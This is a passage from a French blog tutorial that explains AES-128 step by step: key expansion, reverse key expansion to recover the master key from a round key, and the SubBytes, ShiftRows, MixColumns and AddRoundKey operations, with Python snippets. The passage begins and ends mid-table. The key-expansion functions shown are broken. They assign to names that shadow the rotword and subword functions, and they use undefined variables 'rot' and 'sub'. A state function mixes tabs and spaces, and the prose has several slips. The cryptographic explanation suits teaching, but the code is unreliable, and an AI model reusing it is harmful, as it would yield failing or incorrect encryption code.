style="color:#ae81ff">0x4A</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xCC</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0x1D</span>, <span style="color:#ae81ff">0x3A</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0xE8</span>, <span style="color:#ae81ff">0xCB</span>, <span style="color:#ae81ff">0x8D</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x6C</span>, <span style="color:#ae81ff">0xD8</span>, <span style="color:#ae81ff">0xAB</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x9A</span>, <span style="color:#ae81ff">0x2F</span>, <span style="color:#ae81ff">0x5E</span>, <span style="color:#ae81ff">0xBC</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0xC6</span>, <span style="color:#ae81ff">0x97</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x6A</span>, <span style="color:#ae81ff">0xD4</span>, <span style="color:#ae81ff">0xB3</span>, <span style="color:#ae81ff">0x7D</span>, <span style="color:#ae81ff">0xFA</span>, <span style="color:#ae81ff">0xEF</span>, <span style="color:#ae81ff">0xC5</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0xE4</span>, <span style="color:#ae81ff">0xD3</span>, <span style="color:#ae81ff">0xBD</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0xC2</span>, <span style="color:#ae81ff">0x9F</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x4A</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xCC</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0x1D</span>, <span style="color:#ae81ff">0x3A</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0xE8</span>, <span style="color:#ae81ff">0xCB</span>, <span style="color:#ae81ff">0x8D</span>]
</span></span></code></pre></div>
</div>








<style>
  .tabs input#tab-0-3:checked ~ .tab-content-0-3 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-0" id="tab-0-3" />
<label for="tab-0-3" class="tab-label">KeyExpansion</label>
<div class="tab-content tab-content-0-3">
  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># code inspiré de https://github.com/thomasperrot/aes-square-attack/</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">key_expension</span>(key<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>, rounds<span style="color:#f92672">=</span><span style="color:#ae81ff">11</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(key) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">16</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Wrong key length: </span><span style="color:#e6db74">{</span>len(key)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    key_mat <span style="color:#f92672">=</span> [key[i : i <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(key), <span style="color:#ae81ff">4</span>)]
</span></span><span style="display:flex;"><span>    expended_key <span style="color:#f92672">=</span> key_mat
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> r <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, rounds):
</span></span><span style="display:flex;"><span>        rotword <span style="color:#f92672">=</span> rotword(expended_key[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>        subword <span style="color:#f92672">=</span> subword(rot)
</span></span><span style="display:flex;"><span>        first_column <span style="color:#f92672">=</span> xor(sub, expended_key[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>], rcon(r))
</span></span><span style="display:flex;"><span>        expended_key<span style="color:#f92672">.</span>append(first_column)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
</span></span><span style="display:flex;"><span>            expended_key<span style="color:#f92672">.</span>append(xor(expended_key[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], expended_key[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>]))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> expended_key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">reverse_key_expension</span>(expended_key<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>, rounds<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> r <span style="color:#f92672">in</span> reversed(range(<span style="color:#ae81ff">1</span>, rounds)):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
</span></span><span style="display:flex;"><span>            expended_key<span style="color:#f92672">.</span>insert(<span style="color:#ae81ff">0</span>, xor(expended_key[<span style="color:#ae81ff">2</span>], expended_key[<span style="color:#ae81ff">3</span>]))
</span></span><span style="display:flex;"><span>        rotword <span style="color:#f92672">=</span> rotword(expended_key[<span style="color:#ae81ff">2</span>])
</span></span><span style="display:flex;"><span>        subword <span style="color:#f92672">=</span> subword(rot)
</span></span><span style="display:flex;"><span>        first_column <span style="color:#f92672">=</span> xor(expended_key[<span style="color:#ae81ff">3</span>], rcon(r), sub)
</span></span><span style="display:flex;"><span>        expended_key<span style="color:#f92672">.</span>insert(<span style="color:#ae81ff">0</span>, first_column)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> expended_key
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get key from known round_keys and round</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_first_key</span>(key<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>, rounds<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(key) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">16</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Wrong key length: </span><span style="color:#e6db74">{</span>len(key)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    expended_key <span style="color:#f92672">=</span> [key[i : i <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(key), <span style="color:#ae81ff">4</span>)]
</span></span><span style="display:flex;"><span>    fully_expended_key <span style="color:#f92672">=</span> reverse_key_expension(expended_key, rounds)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(fully_expended_key[:<span style="color:#ae81ff">4</span>])
</span></span></code></pre></div>
</div>





</div>


</p>
<h3 id="22-chiffrement-proprement-dit">2.2 Chiffrement proprement dit<a href="#22-chiffrement-proprement-dit" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h3>
<p>Une fois les <em>round_keys</em> obtenus, on va passer à l&rsquo;étape du chiffrement du texte en clair.
Le texte à chiffrer est découpé en blocs de 16 octets et, pour chaque bloc clair, on effectue des opérations pour produire un bloc chiffré de même longueur.
Chaque bloc de 16 octets est représenté en interne par une matrice \(4 \times 4\). Cette représentation est appelé <strong>état (state en anglais)</strong> et les différentes transformations qu&rsquo;il subit sont regroupés en <strong>tours(round en anglais)</strong>, chaque tour impliquant à chaque fois un round_key différent. La représentation se fait en colonnes et non en lignes. On va maintenant s&rsquo;attaquer aux différentes transformations subit.</p>
<h4 id="221-détails-des-opérations">2.2.1 Détails des opérations<a href="#221-d%c3%a9tails-des-op%c3%a9rations" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h4>
<p>Voici toutes les opérations effectuées sur le <em>state</em>, classées par ordre:</p>
<ul>
<li>SubBytes</li>
<li>ShiftRows</li>
<li>MixColumns</li>
<li>AddRoundKey
Et c&rsquo;est toutes ces opérations qui constituent un tour d&rsquo;AES(round). Chaque tour prend en entrée une sous-clé différente and la sortie du tour précédent. En AES-128, on a au total 10 tours. Notez que le dernier tour n&rsquo;applique pas le <em>MixColumns</em>. Et aussi avant le premier tour l&rsquo;opération <em>AddroundKey</em> est effectué.</li>
</ul>
<h5 id="1-subbytes">1. SubBytes<a href="#1-subbytes" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h5>
<p><strong>SubBytes</strong> est une fonction non linéaire qui opère indépendamment sur chacun des 16 octets. Elle utilise une opération sur le corps fini à 256 éléments. C&rsquo;est aussi une <em>Sbox</em> comme dans l&rsquo;opération <em>subword</em>. La bonne nouvelle ici, c&rsquo;est que c&rsquo;est la même <em>Sbox</em> qui est utilisé.</p>
<h5 id="2-shiftrows">2. ShiftRows<a href="#2-shiftrows" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h5>
<p><strong>ShiftRows</strong> est une permutation circulaire vers la gauche de \(i\) cases pour la ligne numéro \(i\) avec \(0 \leq i \leq 3\).


    <figure><img src="https://dilagluc.github.io/crypto_aes/shiftrows.png"/></figure></p>
<h5 id="3-mixcolumns">3. MixColumns<a href="#3-mixcolumns" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h5>
<p><strong>MixColumns</strong> est un produit matriciel à coefficient dans \(F_{256}\). Pour chaque colonne on applique une multiplication par une matrice. Soit la matrice A l’entrée du MixColumns et la matrice B le résultat de la fonction. Alors \(M × A = B\) avec
</p>
$$M = \begin{bmatrix}
\alpha&\alpha+1&1&1 \\\\
1&\alpha&\alpha+1&1 \\\\
1&1&\alpha&\alpha+1 \\\\
\alpha+1&1&1&\alpha \\\\
\end{bmatrix} $$
<p>
Or dans \((F_2)^8\) chaque élément s&rsquo;écrit \({\displaystyle \sum_{i=0}^7}b_i\alpha ^{i}\)
et donc pour avoir alpha tous les \(b_i\) à \(0\) sauf à \(i=1\) ainsi l&rsquo;octet qui code \(\alpha\) est donc \((0,0,0,0,0,0,1,0) = 2\).<br>
M devient alors
</p>
$$M = \begin{bmatrix}
2&3&1&1 \\\\
1&2&3&1 \\\\
1&1&2&3 \\\\
3&1&1&2 \\\\
\end{bmatrix} $$
<p>
Ces additions et multiplications se font dans le copts fini à 256 éléments. On peut également précalculer une table de mapping pour ces multiplications et l&rsquo;addition remplacée par un simple XOR.</p>
<h5 id="4-addroundkey">4. AddRoundKey<a href="#4-addroundkey" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h5>
<p><strong>AddRoundKey</strong> est juste un XOR de la clé de tour \(K_i\) avec la matrice, c&rsquo;est une addition case par case.</p>
<h4 id="222-résumé">2.2.2 Résumé<a href="#222-r%c3%a9sum%c3%a9" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h4>
<p>Pour résumer, voici un aperçu des différentes phases du chiffrement AES:<br>
1.Key expansion ou Key Schedule<br>
Pour une clé de 128 bits, 11 <em>sous-clés</em> différentes de 128 bit appelées aussi &ldquo;round keys&rdquo; sont dérivés. Chacun d&rsquo;eux sera utilisé à l&rsquo;étape AddRoundKey.<br>
2. Première addition de clé<br>
<em>AddRoundKey</em> - les octets de la première sous-clé  sont XORés avec les octets de <em>l&rsquo;état(state)</em>, le state étant un bloc du message en clair écrit sous forme de matrix 4x4. <br>
3. Tours (rounds)<br>
Cette phase s&rsquo;effectue10 fois, 9 pour les tours principaux et une dernière pour le &ldquo;dernier tour&rdquo;:<br>
        a) <em>SubBytes</em> - chaque octet du <em>state</em> est subtitué par un octet différent en utilisant le mapping Sbox.<br>
        b) <em>ShiftRows</em> - les 3 dernières lignes du <em>state</em> subissent un décalage circulaire respectivement de 1, 2 et 3 lignes.<br>
        c) <em>MixColumns</em> - une multiplication matricielle est effectué sur chaque colonne du <em>state</em>. Cette opération n&rsquo;est pas effectué pour le dernier tour. <br>
        d) <em>AddRoundKey</em> - les octets de la sous-clé actuelle sont XORés avec les octets du <em>state</em>.</p>
<h4 id="222-implémentation">2.2.2 Implémentation<a href="#222-impl%c3%a9mentation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h4>
<p>Implémentation finale:
<a href="/crypto_aes/aes_encrypt.py">aes_encrypt.py</a></p>





<div class="tabs tabs-left">
  




<style>
  .tabs input#tab-1-0:checked ~ .tab-content-1-0 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-1" id="tab-1-0" checked/>
<label for="tab-1-0" class="tab-label">State representation</label>
<div class="tab-content tab-content-1-0">
  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tostate</span>(plaintext<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>):
</span></span><span style="display:flex;"><span>	state <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array(list(plaintext), dtype<span style="color:#f92672">=</span>int)
</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>reshape(state, (<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">4</span>), order<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;F&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> state
</span></span></code></pre></div>
</div>








<style>
  .tabs input#tab-1-1:checked ~ .tab-content-1-1 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-1" id="tab-1-1" />
<label for="tab-1-1" class="tab-label">subByte</label>
<div class="tab-content tab-content-1-1">
  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/thomasperrot/aes-square-attack</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">subbytes</span>(state: array, sbox_map<span style="color:#f92672">=</span>get_sbox_map()):
</span></span><span style="display:flex;"><span>    new_state <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>zeros((<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">4</span>), dtype<span style="color:#f92672">=</span>int)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>            new_state[i, j] <span style="color:#f92672">=</span> sbox_map[state[i, j]]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> new_state
</span></span></code></pre></div>
</div>








<style>
  .tabs input#tab-1-2:checked ~ .tab-content-1-2 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-1" id="tab-1-2" />
<label for="tab-1-2" class="tab-label">ShiftRows</label>
<div class="tab-content tab-content-1-2">
  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/thomasperrot/aes-square-attack</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">shiftrows</span>(state: array):
</span></span><span style="display:flex;"><span>    new_state <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array(state, dtype<span style="color:#f92672">=</span>int)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>        new_state[i] <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>roll(new_state[i], <span style="color:#f92672">-</span>i)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> new_state
</span></span></code></pre></div>
</div>








<style>
  .tabs input#tab-1-3:checked ~ .tab-content-1-3 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-1" id="tab-1-3" />
<label for="tab-1-3" class="tab-label">MixColumns</label>
<div class="tab-content tab-content-1-3">
  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># mapping multiplication par 2 et 3</span>
</span></span><span style="display:flex;"><span>MULTIPLICATION_BY_2 <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span>: <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>: <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>: <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>: <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">4</span>: <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">5</span>: <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">6</span>: <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>: <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">8</span>: <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">9</span>: <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">10</span>: <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">11</span>: <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">12</span>: <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">13</span>: <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">14</span>: <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">15</span>: <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">16</span>: <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">17</span>: <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">18</span>: <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">19</span>: <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">20</span>: <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">21</span>: <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">22</span>: <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">23</span>: <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">24</span>: <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">25</span>: <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">26</span>: <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">27</span>: <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">28</span>: <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">29</span>: <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">30</span>: <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">31</span>: <span style="color:#ae81ff">62</span>, <span style="color:#ae81ff">32</span>: <span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">33</span>: <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">34</span>: <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">35</span>: <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">36</span>: <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">37</span>: <span style="color:#ae81ff">74</span>, <span style="color:#ae81ff">38</span>: <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">39</span>: <span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">40</span>: <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">41</span>: <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">42</span>: <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">43</span>: <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">44</span>: <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">45</span>: <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">46</span>: <span style="color:#ae81ff">92</span>, <span style="color:#ae81ff">47</span>: <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">48</span>: <span style="color:#ae81ff">96</span>, <span style="color:#ae81ff">49</span>: <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">50</span>: <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">51</span>: <span style="color:#ae81ff">102</span>, <span style="color:#ae81ff">52</span>: <span style="color:#ae81ff">104</span>, <span style="color:#ae81ff">53</span>: <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">54</span>: <span style="color:#ae81ff">108</span>, <span style="color:#ae81ff">55</span>: <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">56</span>: <span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">57</span>: <span style="color:#ae81ff">114</span>, <span style="color:#ae81ff">58</span>: <span style="color:#ae81ff">116</span>, <span style="color:#ae81ff">59</span>: <span style="color:#ae81ff">118</span>, <span style="color:#ae81ff">60</span>: <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">61</span>: <span style="color:#ae81ff">122</span>, <span style="color:#ae81ff">62</span>: <span style="color:#ae81ff">124</span>, <span style="color:#ae81ff">63</span>: <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">64</span>: <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">65</span>: <span style="color:#ae81ff">130</span>, <span style="color:#ae81ff">66</span>: <span style="color:#ae81ff">132</span>, <span style="color:#ae81ff">67</span>: <span style="color:#ae81ff">134</span>, <span style="color:#ae81ff">68</span>: <span style="color:#ae81ff">136</span>, <span style="color:#ae81ff">69</span>: <span style="color:#ae81ff">138</span>, <span style="color:#ae81ff">70</span>: <span style="color:#ae81ff">140</span>, <span style="color:#ae81ff">71</span>: <span style="color:#ae81ff">142</span>, <span style="color:#ae81ff">72</span>: <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">73</span>: <span style="color:#ae81ff">146</span>, <span style="color:#ae81ff">74</span>: <span style="color:#ae81ff">148</span>, <span style="color:#ae81ff">75</span>: <span style="color:#ae81ff">150</span>, <span style="color:#ae81ff">76</span>: <span style="color:#ae81ff">152</span>, <span style="color:#ae81ff">77</span>: <span style="color:#ae81ff">154</span>, <span style="color:#ae81ff">78</span>: <span style="color:#ae81ff">156</span>, <span style="color:#ae81ff">79</span>: <span style="color:#ae81ff">158</span>, <span style="color:#ae81ff">80</span>: <span style="color:#ae81ff">160</span>, <span style="color:#ae81ff">81</span>: <span style="color:#ae81ff">162</span>, <span style="color:#ae81ff">82</span>: <span style="color:#ae81ff">164</span>, <span style="color:#ae81ff">83</span>: <span style="color:#ae81ff">166</span>, <span style="color:#ae81ff">84</span>: <span style="color:#ae81ff">168</span>, <span style="color:#ae81ff">85</span>: <span style="color:#ae81ff">170</span>, <span style="color:#ae81ff">86</span>: <span style="color:#ae81ff">172</span>, <span style="color:#ae81ff">87</span>: <span style="color:#ae81ff">174</span>, <span style="color:#ae81ff">88</span>: <span style="color:#ae81ff">176</span>, <span style="color:#ae81ff">89</span>: <span style="color:#ae81ff">178</span>, <span style="color:#ae81ff">90</span>: <span style="color:#ae81ff">180</span>, <span style="color:#ae81ff">91</span>: <span style="color:#ae81ff">182</span>, <span style="color:#ae81ff">92</span>: <span style="color:#ae81ff">184</span>, <span style="color:#ae81ff">93</span>: <span style="color:#ae81ff">186</span>, <span style="color:#ae81ff">94</span>: <span style="color:#ae81ff">188</span>, <span style="color:#ae81ff">95</span>: <span style="color:#ae81ff">190</span>, <span style="color:#ae81ff">96</span>: <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">97</span>: <span style="color:#ae81ff">194</span>, <span style="color:#ae81ff">98</span>: <span style="color:#ae81ff">196</span>, <span style="color:#ae81ff">99</span>: <span style="color:#ae81ff">198</span>, <span style="color:#ae81ff">100</span>: <span style="color:#ae81ff">200</span>, <span style="color:#ae81ff">101</span>: <span style="color:#ae81ff">202</span>, <span style="color:#ae81ff">102</span>: <span style="color:#ae81ff">204</span>, <span style="color:#ae81ff">103</span>: <span style="color:#ae81ff">206</span>, <span style="color:#ae81ff">104</span>: <span style="color:#ae81ff">208</span>, <span style="color:#ae81ff">105</span>: <span style="color:#ae81ff">210</span>, <span style="color:#ae81ff">106</span>: <span style="color:#ae81ff">212</span>, <span style="color:#ae81ff">107</span>: <span style="color:#ae81ff">214</span>, <span style="color:#ae81ff">108</span>: <span style="color:#ae81ff">216</span>, <span style="color:#ae81ff">109</span>: <span style="color:#ae81ff">218</span>, <span style="color:#ae81ff">110</span>: <span style="color:#ae81ff">220</span>, <span style="color:#ae81ff">111</span>: <span style="color:#ae81ff">222</span>, <span style="color:#ae81ff">112</span>: <span style="color:#ae81ff">224</span>, <span style="color:#ae81ff">113</span>: <span style="color:#ae81ff">226</span>, <span style="color:#ae81ff">114</span>: <span style="color:#ae81ff">228</span>, <span style="color:#ae81ff">115</span>: <span style="color:#ae81ff">230</span>, <span style="color:#ae81ff">116</span>: <span style="color:#ae81ff">232</span>, <span style="color:#ae81ff">117</span>: <span style="color:#ae81ff">234</span>, <span style="color:#ae81ff">118</span>: <span style="color:#ae81ff">236</span>, <span style="color:#ae81ff">119</span>: <span style="color:#ae81ff">238</span>, <span style="color:#ae81ff">120</span>: <span style="color:#ae81ff">240</span>, <span style="color:#ae81ff">121</span>: <span style="color:#ae81ff">242</span>, 